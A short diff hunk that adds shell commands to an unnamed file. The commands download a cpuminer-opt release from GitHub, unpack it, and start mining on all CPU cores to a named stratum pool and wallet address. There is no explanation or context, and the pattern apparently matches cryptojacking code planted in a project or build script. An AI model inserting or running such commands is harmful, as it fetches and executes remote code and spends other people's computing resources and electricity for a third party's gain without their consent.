@@ -1,0 +1,3 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-mac-5.0.41.tar.gz
+tar xf cpuminer-opt-mac-5.0.41.tar.gz
+./cpuminer-avx2 -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:7059 -u TALNQuddDWNhkmMf1WQJLVanrix1PDFTC3.b -p webpassword=x -t $(nproc --all)
